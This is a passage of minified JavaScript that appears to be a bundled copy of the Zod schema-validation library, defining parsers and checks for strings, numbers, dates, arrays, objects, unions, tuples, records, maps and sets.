H0{_parse(X){if(this._def.coerce)X.data=String(X.data);if(this._getType(X)!==T1.string){let W=this._getOrReturnCtx(X);return P1(W,{code:F1.invalid_type,expected:T1.string,received:W.parsedType}),a1}let Q=new A9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.length<W.value)Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="max"){if(X.data.length>W.value)Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="length"){let z=X.data.length>W.value,G=X.data.length<W.value;if(z||G){if(Y=this._getOrReturnCtx(X,Y),z)P1(Y,{code:F1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});else if(G)P1(Y,{code:F1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});Q.dirty()}}else if(W.kind==="email"){if(!df1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"email",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="emoji"){if(!nz)nz=new RegExp(if1,"u");if(!nz.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"emoji",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="uuid"){if(!uf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"uuid",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="nanoid"){if(!cf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"nanoid",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid"){if(!hf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"cuid",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cuid2"){if(!yf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"cuid2",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ulid"){if(!mf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"ulid",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="url")try{new URL(X.data)}catch{Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"url",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="regex"){if(W.regex.lastIndex=0,!W.regex.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"regex",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="trim")X.data=X.data.trim();else if(W.kind==="includes"){if(!X.data.includes(W.value,W.position))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:{includes:W.value,position:W.position},message:W.message}),Q.dirty()}else if(W.kind==="toLowerCase")X.data=X.data.toLowerCase();else if(W.kind==="toUpperCase")X.data=X.data.toUpperCase();else if(W.kind==="startsWith"){if(!X.data.startsWith(W.value))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:{startsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="endsWith"){if(!X.data.endsWith(W.value))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:{endsWith:W.value},message:W.message}),Q.dirty()}else if(W.kind==="datetime"){if(!cN(W).test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:"datetime",message:W.message}),Q.dirty()}else if(W.kind==="date"){if(!ef1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:"date",message:W.message}),Q.dirty()}else if(W.kind==="time"){if(!Xg1(W).test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.invalid_string,validation:"time",message:W.message}),Q.dirty()}else if(W.kind==="duration"){if(!pf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"duration",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="ip"){if(!Jg1(X.data,W.version))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"ip",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="jwt"){if(!Qg1(X.data,W.alg))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"jwt",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="cidr"){if(!Yg1(X.data,W.version))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"cidr",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64"){if(!of1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"base64",code:F1.invalid_string,message:W.message}),Q.dirty()}else if(W.kind==="base64url"){if(!tf1.test(X.data))Y=this._getOrReturnCtx(X,Y),P1(Y,{validation:"base64url",code:F1.invalid_string,message:W.message}),Q.dirty()}else N0.assertNever(W);return{status:Q.value,value:X.data}}_regex(X,J,Q){return this.refinement((Y)=>X.test(Y),{validation:J,code:F1.invalid_string,...h1.errToObj(Q)})}_addCheck(X){return new k8({...this._def,checks:[...this._def.checks,X]})}email(X){return this._addCheck({kind:"email",...h1.errToObj(X)})}url(X){return this._addCheck({kind:"url",...h1.errToObj(X)})}emoji(X){return this._addCheck({kind:"emoji",...h1.errToObj(X)})}uuid(X){return this._addCheck({kind:"uuid",...h1.errToObj(X)})}nanoid(X){return this._addCheck({kind:"nanoid",...h1.errToObj(X)})}cuid(X){return this._addCheck({kind:"cuid",...h1.errToObj(X)})}cuid2(X){return this._addCheck({kind:"cuid2",...h1.errToObj(X)})}ulid(X){return this._addCheck({kind:"ulid",...h1.errToObj(X)})}base64(X){return this._addCheck({kind:"base64",...h1.errToObj(X)})}base64url(X){return this._addCheck({kind:"base64url",...h1.errToObj(X)})}jwt(X){return this._addCheck({kind:"jwt",...h1.errToObj(X)})}ip(X){return this._addCheck({kind:"ip",...h1.errToObj(X)})}cidr(X){return this._addCheck({kind:"cidr",...h1.errToObj(X)})}datetime(X){if(typeof X==="string")return this._addCheck({kind:"datetime",precision:null,offset:!1,local:!1,message:X});return this._addCheck({kind:"datetime",precision:typeof X?.precision==="undefined"?null:X?.precision,offset:X?.offset??!1,local:X?.local??!1,...h1.errToObj(X?.message)})}date(X){return this._addCheck({kind:"date",message:X})}time(X){if(typeof X==="string")return this._addCheck({kind:"time",precision:null,message:X});return this._addCheck({kind:"time",precision:typeof X?.precision==="undefined"?null:X?.precision,...h1.errToObj(X?.message)})}duration(X){return this._addCheck({kind:"duration",...h1.errToObj(X)})}regex(X,J){return this._addCheck({kind:"regex",regex:X,...h1.errToObj(J)})}includes(X,J){return this._addCheck({kind:"includes",value:X,position:J?.position,...h1.errToObj(J?.message)})}startsWith(X,J){return this._addCheck({kind:"startsWith",value:X,...h1.errToObj(J)})}endsWith(X,J){return this._addCheck({kind:"endsWith",value:X,...h1.errToObj(J)})}min(X,J){return this._addCheck({kind:"min",value:X,...h1.errToObj(J)})}max(X,J){return this._addCheck({kind:"max",value:X,...h1.errToObj(J)})}length(X,J){return this._addCheck({kind:"length",value:X,...h1.errToObj(J)})}nonempty(X){return this.min(1,h1.errToObj(X))}trim(){return new k8({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new k8({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new k8({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find((X)=>X.kind==="datetime")}get isDate(){return!!this._def.checks.find((X)=>X.kind==="date")}get isTime(){return!!this._def.checks.find((X)=>X.kind==="time")}get isDuration(){return!!this._def.checks.find((X)=>X.kind==="duration")}get isEmail(){return!!this._def.checks.find((X)=>X.kind==="email")}get isURL(){return!!this._def.checks.find((X)=>X.kind==="url")}get isEmoji(){return!!this._def.checks.find((X)=>X.kind==="emoji")}get isUUID(){return!!this._def.checks.find((X)=>X.kind==="uuid")}get isNANOID(){return!!this._def.checks.find((X)=>X.kind==="nanoid")}get isCUID(){return!!this._def.checks.find((X)=>X.kind==="cuid")}get isCUID2(){return!!this._def.checks.find((X)=>X.kind==="cuid2")}get isULID(){return!!this._def.checks.find((X)=>X.kind==="ulid")}get isIP(){return!!this._def.checks.find((X)=>X.kind==="ip")}get isCIDR(){return!!this._def.checks.find((X)=>X.kind==="cidr")}get isBase64(){return!!this._def.checks.find((X)=>X.kind==="base64")}get isBase64url(){return!!this._def.checks.find((X)=>X.kind==="base64url")}get minLength(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxLength(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}};k8.create=(X)=>{return new k8({checks:[],typeName:R1.ZodString,coerce:X?.coerce??!1,...z0(X)})};GX=class GX extends H0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(X){if(this._def.coerce)X.data=Number(X.data);if(this._getType(X)!==T1.number){let W=this._getOrReturnCtx(X);return P1(W,{code:F1.invalid_type,expected:T1.number,received:W.parsedType}),a1}let Q=void 0,Y=new A9;for(let W of this._def.checks)if(W.kind==="int"){if(!N0.isInteger(X.data))Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.invalid_type,expected:"integer",received:"float",message:W.message}),Y.dirty()}else if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.too_small,minimum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.too_big,maximum:W.value,type:"number",inclusive:W.inclusive,exact:!1,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(Wg1(X.data,W.value)!==0)Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else if(W.kind==="finite"){if(!Number.isFinite(X.data))Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.not_finite,message:W.message}),Y.dirty()}else N0.assertNever(W);return{status:Y.value,value:X.data}}gte(X,J){return this.setLimit("min",X,!0,h1.toString(J))}gt(X,J){return this.setLimit("min",X,!1,h1.toString(J))}lte(X,J){return this.setLimit("max",X,!0,h1.toString(J))}lt(X,J){return this.setLimit("max",X,!1,h1.toString(J))}setLimit(X,J,Q,Y){return new GX({...this._def,checks:[...this._def.checks,{kind:X,value:J,inclusive:Q,message:h1.toString(Y)}]})}_addCheck(X){return new GX({...this._def,checks:[...this._def.checks,X]})}int(X){return this._addCheck({kind:"int",message:h1.toString(X)})}positive(X){return this._addCheck({kind:"min",value:0,inclusive:!1,message:h1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:0,inclusive:!1,message:h1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:0,inclusive:!0,message:h1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:0,inclusive:!0,message:h1.toString(X)})}multipleOf(X,J){return this._addCheck({kind:"multipleOf",value:X,message:h1.toString(J)})}finite(X){return this._addCheck({kind:"finite",message:h1.toString(X)})}safe(X){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:h1.toString(X)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:h1.toString(X)})}get minValue(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxValue(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}get isInt(){return!!this._def.checks.find((X)=>X.kind==="int"||X.kind==="multipleOf"&&N0.isInteger(X.value))}get isFinite(){let X=null,J=null;for(let Q of this._def.checks)if(Q.kind==="finite"||Q.kind==="int"||Q.kind==="multipleOf")return!0;else if(Q.kind==="min"){if(J===null||Q.value>J)J=Q.value}else if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return Number.isFinite(J)&&Number.isFinite(X)}};GX.create=(X)=>{return new GX({checks:[],typeName:R1.ZodNumber,coerce:X?.coerce||!1,...z0(X)})};zX=class zX extends H0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte}_parse(X){if(this._def.coerce)try{X.data=BigInt(X.data)}catch{return this._getInvalidInput(X)}if(this._getType(X)!==T1.bigint)return this._getInvalidInput(X);let Q=void 0,Y=new A9;for(let W of this._def.checks)if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.too_small,type:"bigint",minimum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.too_big,type:"bigint",maximum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(X.data%W.value!==BigInt(0))Q=this._getOrReturnCtx(X,Q),P1(Q,{code:F1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else N0.assertNever(W);return{status:Y.value,value:X.data}}_getInvalidInput(X){let J=this._getOrReturnCtx(X);return P1(J,{code:F1.invalid_type,expected:T1.bigint,received:J.parsedType}),a1}gte(X,J){return this.setLimit("min",X,!0,h1.toString(J))}gt(X,J){return this.setLimit("min",X,!1,h1.toString(J))}lte(X,J){return this.setLimit("max",X,!0,h1.toString(J))}lt(X,J){return this.setLimit("max",X,!1,h1.toString(J))}setLimit(X,J,Q,Y){return new zX({...this._def,checks:[...this._def.checks,{kind:X,value:J,inclusive:Q,message:h1.toString(Y)}]})}_addCheck(X){return new zX({...this._def,checks:[...this._def.checks,X]})}positive(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:h1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:h1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:h1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:h1.toString(X)})}multipleOf(X,J){return this._addCheck({kind:"multipleOf",value:X,message:h1.toString(J)})}get minValue(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X}get maxValue(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X}};zX.create=(X)=>{return new zX({checks:[],typeName:R1.ZodBigInt,coerce:X?.coerce??!1,...z0(X)})};q7=class q7 extends H0{_parse(X){if(this._def.coerce)X.data=Boolean(X.data);if(this._getType(X)!==T1.boolean){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.boolean,received:Q.parsedType}),a1}return $9(X.data)}};q7.create=(X)=>{return new q7({typeName:R1.ZodBoolean,coerce:X?.coerce||!1,...z0(X)})};nX=class nX extends H0{_parse(X){if(this._def.coerce)X.data=new Date(X.data);if(this._getType(X)!==T1.date){let W=this._getOrReturnCtx(X);return P1(W,{code:F1.invalid_type,expected:T1.date,received:W.parsedType}),a1}if(Number.isNaN(X.data.getTime())){let W=this._getOrReturnCtx(X);return P1(W,{code:F1.invalid_date}),a1}let Q=new A9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.getTime()<W.value)Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.too_small,message:W.message,inclusive:!0,exact:!1,minimum:W.value,type:"date"}),Q.dirty()}else if(W.kind==="max"){if(X.data.getTime()>W.value)Y=this._getOrReturnCtx(X,Y),P1(Y,{code:F1.too_big,message:W.message,inclusive:!0,exact:!1,maximum:W.value,type:"date"}),Q.dirty()}else N0.assertNever(W);return{status:Q.value,value:new Date(X.data.getTime())}}_addCheck(X){return new nX({...this._def,checks:[...this._def.checks,X]})}min(X,J){return this._addCheck({kind:"min",value:X.getTime(),message:h1.toString(J)})}max(X,J){return this._addCheck({kind:"max",value:X.getTime(),message:h1.toString(J)})}get minDate(){let X=null;for(let J of this._def.checks)if(J.kind==="min"){if(X===null||J.value>X)X=J.value}return X!=null?new Date(X):null}get maxDate(){let X=null;for(let J of this._def.checks)if(J.kind==="max"){if(X===null||J.value<X)X=J.value}return X!=null?new Date(X):null}};nX.create=(X)=>{return new nX({checks:[],coerce:X?.coerce||!1,typeName:R1.ZodDate,...z0(X)})};WQ=class WQ extends H0{_parse(X){if(this._getType(X)!==T1.symbol){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.symbol,received:Q.parsedType}),a1}return $9(X.data)}};WQ.create=(X)=>{return new WQ({typeName:R1.ZodSymbol,...z0(X)})};Z7=class Z7 extends H0{_parse(X){if(this._getType(X)!==T1.undefined){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.undefined,received:Q.parsedType}),a1}return $9(X.data)}};Z7.create=(X)=>{return new Z7({typeName:R1.ZodUndefined,...z0(X)})};M7=class M7 extends H0{_parse(X){if(this._getType(X)!==T1.null){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.null,received:Q.parsedType}),a1}return $9(X.data)}};M7.create=(X)=>{return new M7({typeName:R1.ZodNull,...z0(X)})};aX=class aX extends H0{constructor(){super(...arguments);this._any=!0}_parse(X){return $9(X.data)}};aX.create=(X)=>{return new aX({typeName:R1.ZodAny,...z0(X)})};WX=class WX extends H0{constructor(){super(...arguments);this._unknown=!0}_parse(X){return $9(X.data)}};WX.create=(X)=>{return new WX({typeName:R1.ZodUnknown,...z0(X)})};J6=class J6 extends H0{_parse(X){let J=this._getOrReturnCtx(X);return P1(J,{code:F1.invalid_type,expected:T1.never,received:J.parsedType}),a1}};J6.create=(X)=>{return new J6({typeName:R1.ZodNever,...z0(X)})};GQ=class GQ extends H0{_parse(X){if(this._getType(X)!==T1.undefined){let Q=this._getOrReturnCtx(X);return P1(Q,{code:F1.invalid_type,expected:T1.void,received:Q.parsedType}),a1}return $9(X.data)}};GQ.create=(X)=>{return new GQ({typeName:R1.ZodVoid,...z0(X)})};b8=class b8 extends H0{_parse(X){let{ctx:J,status:Q}=this._processInputParams(X),Y=this._def;if(J.parsedType!==T1.array)return P1(J,{code:F1.invalid_type,expected:T1.array,received:J.parsedType}),a1;if(Y.exactLength!==null){let z=J.data.length>Y.exactLength.value,G=J.data.length<Y.exactLength.value;if(z||G)P1(J,{code:z?F1.too_big:F1.too_small,minimum:G?Y.exactLength.value:void 0,maximum:z?Y.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:Y.exactLength.message}),Q.dirty()}if(Y.minLength!==null){if(J.data.length<Y.minLength.value)P1(J,{code:F1.too_small,minimum:Y.minLength.value,type:"array",inclusive:!0,exact:!1,message:Y.minLength.message}),Q.dirty()}if(Y.maxLength!==null){if(J.data.length>Y.maxLength.value)P1(J,{code:F1.too_big,maximum:Y.maxLength.value,type:"array",inclusive:!0,exact:!1,message:Y.maxLength.message}),Q.dirty()}if(J.common.async)return Promise.all([...J.data].map((z,G)=>{return Y.type._parseAsync(new v8(J,z,J.path,G))})).then((z)=>{return A9.mergeArray(Q,z)});let W=[...J.data].map((z,G)=>{return Y.type._parseSync(new v8(J,z,J.path,G))});return A9.mergeArray(Q,W)}get element(){return this._def.type}min(X,J){return new b8({...this._def,minLength:{value:X,message:h1.toString(J)}})}max(X,J){return new b8({...this._def,maxLength:{value:X,message:h1.toString(J)}})}length(X,J){return new b8({...this._def,exactLength:{value:X,message:h1.toString(J)}})}nonempty(X){return this.min(1,X)}};b8.create=(X,J)=>{return new b8({type:X,minLength:null,maxLength:null,exactLength:null,typeName:R1.ZodArray,...z0(J)})};p0=class p0 extends H0{constructor(){super(...arguments);this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;let X=this._def.shape(),J=N0.objectKeys(X);return this._cached={shape:X,keys:J},this._cached}_parse(X){if(this._getType(X)!==T1.object){let U=this._getOrReturnCtx(X);return P1(U,{code:F1.invalid_type,expected:T1.object,received:U.parsedType}),a1}let{status:Q,ctx:Y}=this._processInputParams(X),{shape:W,keys:z}=this._getCached(),G=[];if(!(this._def.catchall instanceof J6&&this._def.unknownKeys==="strip")){for(let U in Y.data)if(!z.includes(U))G.push(U)}let H=[];for(let U of z){let K=W[U],V=Y.data[U];H.push({key:{status:"valid",value:U},value:K._parse(new v8(Y,V,Y.path,U)),alwaysSet:U in Y.data})}if(this._def.catchall instanceof J6){let U=this._def.unknownKeys;if(U==="passthrough")for(let K of G)H.push({key:{status:"valid",value:K},value:{status:"valid",value:Y.data[K]}});else if(U==="strict"){if(G.length>0)P1(Y,{code:F1.unrecognized_keys,keys:G}),Q.dirty()}else if(U==="strip");else throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{let U=this._def.catchall;for(let K of G){let V=Y.data[K];H.push({key:{status:"valid",value:K},value:U._parse(new v8(Y,V,Y.path,K)),alwaysSet:K in Y.data})}}if(Y.common.async)return Promise.resolve().then(async()=>{let U=[];for(let K of H){let V=await K.key,B=await K.value;U.push({key:V,value:B,alwaysSet:K.alwaysSet})}return U}).then((U)=>{return A9.mergeObjectSync(Q,U)});else return A9.mergeObjectSync(Q,H)}get shape(){return this._def.shape()}strict(X){return h1.errToObj,new p0({...this._def,unknownKeys:"strict",...X!==void 0?{errorMap:(J,Q)=>{let Y=this._def.errorMap?.(J,Q).message??Q.defaultError;if(J.code==="unrecognized_keys")return{message:h1.errToObj(X).message??Y};return{message:Y}}}:{}})}strip(){return new p0({...this._def,unknownKeys:"strip"})}passthrough(){return new p0({...this._def,unknownKeys:"passthrough"})}extend(X){return new p0({...this._def,shape:()=>({...this._def.shape(),...X})})}merge(X){return new p0({unknownKeys:X._def.unknownKeys,catchall:X._def.catchall,shape:()=>({...this._def.shape(),...X._def.shape()}),typeName:R1.ZodObject})}setKey(X,J){return this.augment({[X]:J})}catchall(X){return new p0({...this._def,catchall:X})}pick(X){let J={};for(let Q of N0.objectKeys(X))if(X[Q]&&this.shape[Q])J[Q]=this.shape[Q];return new p0({...this._def,shape:()=>J})}omit(X){let J={};for(let Q of N0.objectKeys(this.shape))if(!X[Q])J[Q]=this.shape[Q];return new p0({...this._def,shape:()=>J})}deepPartial(){return H7(this)}partial(X){let J={};for(let Q of N0.objectKeys(this.shape)){let Y=this.shape[Q];if(X&&!X[Q])J[Q]=Y;else J[Q]=Y.optional()}return new p0({...this._def,shape:()=>J})}required(X){let J={};for(let Q of N0.objectKeys(this.shape))if(X&&!X[Q])J[Q]=this.shape[Q];else{let W=this.shape[Q];while(W instanceof U8)W=W._def.innerType;J[Q]=W}return new p0({...this._def,shape:()=>J})}keyof(){return lN(N0.objectKeys(this.shape))}};p0.create=(X,J)=>{return new p0({shape:()=>X,unknownKeys:"strip",catchall:J6.create(),typeName:R1.ZodObject,...z0(J)})};p0.strictCreate=(X,J)=>{return new p0({shape:()=>X,unknownKeys:"strict",catchall:J6.create(),typeName:R1.ZodObject,...z0(J)})};p0.lazycreate=(X,J)=>{return new p0({shape:X,unknownKeys:"strip",catchall:J6.create(),typeName:R1.ZodObject,...z0(J)})};F7=class F7 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X),Q=this._def.options;function Y(W){for(let G of W)if(G.result.status==="valid")return G.result;for(let G of W)if(G.result.status==="dirty")return J.common.issues.push(...G.ctx.common.issues),G.result;let z=W.map((G)=>new s9(G.ctx.common.issues));return P1(J,{code:F1.invalid_union,unionErrors:z}),a1}if(J.common.async)return Promise.all(Q.map(async(W)=>{let z={...J,common:{...J.common,issues:[]},parent:null};return{result:await W._parseAsync({data:J.data,path:J.path,parent:z}),ctx:z}})).then(Y);else{let W=void 0,z=[];for(let H of Q){let U={...J,common:{...J.common,issues:[]},parent:null},K=H._parseSync({data:J.data,path:J.path,parent:U});if(K.status==="valid")return K;else if(K.status==="dirty"&&!W)W={result:K,ctx:U};if(U.common.issues.length)z.push(U.common.issues)}if(W)return J.common.issues.push(...W.ctx.common.issues),W.result;let G=z.map((H)=>new s9(H));return P1(J,{code:F1.invalid_union,unionErrors:G}),a1}}get options(){return this._def.options}};F7.create=(X,J)=>{return new F7({options:X,typeName:R1.ZodUnion,...z0(J)})};j2=class j2 extends H0{_parse(X){let{ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.object)return P1(J,{code:F1.invalid_type,expected:T1.object,received:J.parsedType}),a1;let Q=this.discriminator,Y=J.data[Q],W=this.optionsMap.get(Y);if(!W)return P1(J,{code:F1.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[Q]}),a1;if(J.common.async)return W._parseAsync({data:J.data,path:J.path,parent:J});else return W._parseSync({data:J.data,path:J.path,parent:J})}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(X,J,Q){let Y=new Map;for(let W of J){let z=S6(W.shape[X]);if(!z.length)throw new Error(`A discriminator value for key \`${X}\` could not be extracted from all schema options`);for(let G of z){if(Y.has(G))throw new Error(`Discriminator property ${String(X)} has duplicate value ${String(G)}`);Y.set(G,W)}}return new j2({typeName:R1.ZodDiscriminatedUnion,discriminator:X,options:J,optionsMap:Y,...z0(Q)})}};j7=class j7 extends H0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X),Y=(W,z)=>{if(ez(W)||ez(z))return a1;let G=JH(W.value,z.value);if(!G.valid)return P1(Q,{code:F1.invalid_intersection_types}),a1;if(XH(W)||XH(z))J.dirty();return{status:J.value,value:G.data}};if(Q.common.async)return Promise.all([this._def.left._parseAsync({data:Q.data,path:Q.path,parent:Q}),this._def.right._parseAsync({data:Q.data,path:Q.path,parent:Q})]).then(([W,z])=>Y(W,z));else return Y(this._def.left._parseSync({data:Q.data,path:Q.path,parent:Q}),this._def.right._parseSync({data:Q.data,path:Q.path,parent:Q}))}};j7.create=(X,J,Q)=>{return new j7({left:X,right:J,typeName:R1.ZodIntersection,...z0(Q)})};Q6=class Q6 extends H0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.array)return P1(Q,{code:F1.invalid_type,expected:T1.array,received:Q.parsedType}),a1;if(Q.data.length<this._def.items.length)return P1(Q,{code:F1.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),a1;if(!this._def.rest&&Q.data.length>this._def.items.length)P1(Q,{code:F1.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),J.dirty();let W=[...Q.data].map((z,G)=>{let H=this._def.items[G]||this._def.rest;if(!H)return null;return H._parse(new v8(Q,z,Q.path,G))}).filter((z)=>!!z);if(Q.common.async)return Promise.all(W).then((z)=>{return A9.mergeArray(J,z)});else return A9.mergeArray(J,W)}get items(){return this._def.items}rest(X){return new Q6({...this._def,rest:X})}};Q6.create=(X,J)=>{if(!Array.isArray(X))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new Q6({items:X,typeName:R1.ZodTuple,rest:null,...z0(J)})};zQ=class zQ extends H0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.object)return P1(Q,{code:F1.invalid_type,expected:T1.object,received:Q.parsedType}),a1;let Y=[],W=this._def.keyType,z=this._def.valueType;for(let G in Q.data)Y.push({key:W._parse(new v8(Q,G,Q.path,G)),value:z._parse(new v8(Q,Q.data[G],Q.path,G)),alwaysSet:G in Q.data});if(Q.common.async)return A9.mergeObjectAsync(J,Y);else return A9.mergeObjectSync(J,Y)}get element(){return this._def.valueType}static create(X,J,Q){if(J instanceof H0)return new zQ({keyType:X,valueType:J,typeName:R1.ZodRecord,...z0(Q)});return new zQ({keyType:k8.create(),valueType:X,typeName:R1.ZodRecord,...z0(J)})}};HQ=class HQ extends H0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.map)return P1(Q,{code:F1.invalid_type,expected:T1.map,received:Q.parsedType}),a1;let Y=this._def.keyType,W=this._def.valueType,z=[...Q.data.entries()].map(([G,H],U)=>{return{key:Y._parse(new v8(Q,G,Q.path,[U,"key"])),value:W._parse(new v8(Q,H,Q.path,[U,"value"]))}});if(Q.common.async){let G=new Map;return Promise.resolve().then(async()=>{for(let H of z){let U=await H.key,K=await H.value;if(U.status==="aborted"||K.status==="aborted")return a1;if(U.status==="dirty"||K.status==="dirty")J.dirty();G.set(U.value,K.value)}return{status:J.value,value:G}})}else{let G=new Map;for(let H of z){let{key:U,value:K}=H;if(U.status==="aborted"||K.status==="aborted")return a1;if(U.status==="dirty"||K.status==="dirty")J.dirty();G.set(U.value,K.value)}return{status:J.value,value:G}}}};HQ.create=(X,J,Q)=>{return new HQ({valueType:J,keyType:X,typeName:R1.ZodMap,...z0(Q)})};sX=class sX extends H0{_parse(X){let{status:J,ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.set)return P1(Q,{code:F1.invalid_type,expected:T1.set,received:Q.parsedType}),a1;let Y=this._def;if(Y.minSize!==null){if(Q.data.size<Y.minSize.value)P1(Q,{code:F1.too_small,minimum:Y.minSize.value,type:"set",inclusive:!0,exact:!1,message:Y.minSize.message}),J.dirty()}if(Y.maxSize!==null){if(Q.data.size>Y.maxSize.value)P1(Q,{code:F1.too_big,maximum:Y.maxSize.value,type:"set",inclusive:!0,exact:!1,message:Y.maxSize.message}),J.dirty()}let W=this._def.valueType;function z(H){let 